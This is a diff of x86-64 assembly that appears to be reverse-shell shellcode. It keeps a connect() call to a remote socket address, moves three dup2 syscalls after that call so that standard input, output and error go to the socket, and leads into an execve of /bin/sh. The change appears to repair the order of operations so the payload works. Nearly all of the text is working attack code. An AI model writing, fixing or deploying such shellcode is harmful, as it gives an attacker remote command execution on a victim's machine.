@@ -20,30 +20,27 @@ _start:
 
         mov r8, rax
 
-        ;dup2(client_fd, new_fd)
-        mov rax, 33
-        push r8
-        pop rdi
-        mov rsi, 0
-        syscall
-        
-        mov rax, 33
-        push r8
-        pop rdi
-        mov rsi, 1
-        syscall
-
-        mov rax, 33
-        push r8
-        pop rdi
-        mov rsi, 2
-        syscall
-
         ;connect(socket, sockaddr, 16)
         mov rdi, rax
         lea rsi, [rel sockaddr]
         mov rdx, 16
         mov rax, 42
+        syscall
+
+        ;dup2(client_fd, new_fd)
+        mov rax, 33
+        mov rdi, r8
+        mov rsi, 0
+        syscall
+        
+        mov rax, 33
+        mov rdi, r8
+        mov rsi, 1
+        syscall
+
+        mov rax, 33
+        mov rdi, r8
+        mov rsi, 2
         syscall
 
         ;execve("/bin/sh", 0, 0)
